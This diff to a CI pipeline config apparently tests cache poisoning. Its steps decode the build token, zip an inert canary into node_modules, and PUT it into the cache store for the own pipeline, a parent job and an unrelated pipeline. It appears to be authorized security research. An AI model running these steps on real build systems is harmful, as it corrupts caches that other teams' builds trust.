@@ -7,6 +7,10 @@ jobs:
             pipeline:
                 - node_modules
         steps:
-            - restored-listing: ls -la node_modules 2>/dev/null || echo "node_modules absent"
-            - canary-check: if [ -f node_modules/POISONED.txt ]; then echo "ATTACKER CONTENT PRESENT IN RESTORED CACHE"; cat node_modules/POISONED.txt; else echo "no attacker content in restored cache"; fi
-            - seed-legitimate: mkdir -p node_modules && echo "legitimate dependency" > node_modules/REAL.txt && ls -la node_modules
+            - identity: echo "pipeline=$SD_PIPELINE_ID job=$SD_JOB_ID build=$SD_BUILD_ID pr=$SD_PULL_REQUEST parent_job=$SD_PR_PARENT_JOB_ID store=$SD_STORE_URL"
+            - token-claims: python3 -c "import os,base64,json;t=os.environ['SD_TOKEN'].split('.')[1];print(json.dumps(json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))),indent=1))"
+            - build-payload: python3 -c "import zipfile,os;os.makedirs('node_modules',exist_ok=True);open('node_modules/POISONED.txt','w').write('inert canary written by PR build '+os.environ['SD_BUILD_ID']+' of pipeline '+os.environ['SD_PIPELINE_ID']+chr(10));z=zipfile.ZipFile('payload.zip','w');z.write('node_modules/POISONED.txt');z.close()"
+            - a-write-own-pipeline-cache: 'curl -sS -i -X PUT -H "Authorization: Bearer $SD_TOKEN" -H "Content-Type: application/zip" --data-binary @payload.zip "${SD_STORE_URL}caches/pipelines/$SD_PIPELINE_ID/node_modules"'
+            - b-control-parent-job-cache: 'curl -sS -i -X PUT -H "Authorization: Bearer $SD_TOKEN" -H "Content-Type: application/zip" --data-binary @payload.zip "${SD_STORE_URL}caches/jobs/$SD_PR_PARENT_JOB_ID/node_modules"'
+            - c-control-other-pipeline-cache: 'curl -sS -i -X PUT -H "Authorization: Bearer $SD_TOKEN" -H "Content-Type: application/zip" --data-binary @payload.zip "${SD_STORE_URL}caches/pipelines/999999/node_modules"'
+            - d-readback-own-pipeline-cache: 'curl -sS -X GET -H "Authorization: Bearer $SD_TOKEN" "${SD_STORE_URL}caches/pipelines/$SD_PIPELINE_ID/node_modules" -o readback.zip -w "readback http=%{http_code} bytes=%{size_download}" && echo && unzip -l readback.zip'
